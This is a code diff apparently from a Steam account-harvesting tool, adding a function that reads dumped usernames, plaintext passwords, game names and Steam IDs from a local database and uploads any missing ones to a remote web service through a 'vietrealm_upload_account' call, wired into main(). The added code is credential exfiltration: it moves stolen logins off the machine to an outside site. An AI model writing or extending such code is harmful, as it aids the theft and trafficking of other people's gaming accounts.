@@ -335,6 +335,38 @@ def is_account_dumped(conn, username):
     c.execute("SELECT 1 FROM accounts WHERE username = ?", (username,))
     return c.fetchone() is not None
 
+def upload_db_accounts_to_web(conn, existing_on_web):
+    """Push accounts already in the local DB that never made it onto the web.
+
+    The scan skips accounts already in the DB, so an account dumped before the
+    web link existed would otherwise never be uploaded. This re-sends anything
+    the web does not have yet.
+    """
+    c = conn.cursor()
+    try:
+        rows = list(c.execute(
+            "SELECT username, password, game_name, steam_id FROM accounts"
+        ))
+    except sqlite3.OperationalError:
+        return 0
+
+    sent = 0
+    for username, password, game_name, steam_id in rows:
+        if not username or not password:
+            continue
+        if str(username).strip() in existing_on_web:
+            continue
+        bits = ['Steam']
+        if game_name and str(game_name) != 'N/A':
+            bits.append(f'game:{game_name}')
+        if steam_id and str(steam_id) not in ('N/A', '0', 'None', ''):
+            bits.append(f'id:{steam_id}')
+        if vietrealm_upload_account(username, password, note=' | '.join(bits)):
+            sent += 1
+    if sent:
+        print(f"{C.GREEN}[+] Uploaded {sent} account(s) from local DB to the web{C.RESET}")
+    return sent
+
 def save_account_to_db(conn, info):
     """Save account to database."""
     c = conn.cursor()
@@ -1538,6 +1570,10 @@ def main():
 
     existing_on_web = vietrealm_existing_usernames()
     uploaded = 0
+
+    # Accounts dumped before this link existed are already in the local DB, so the
+    # scan above skipped them. Push any of those the web still doesn't have.
+    uploaded += upload_db_accounts_to_web(db_conn, existing_on_web)
 
     steam_upload = {}
     for username, info in (accounts or {}).items():
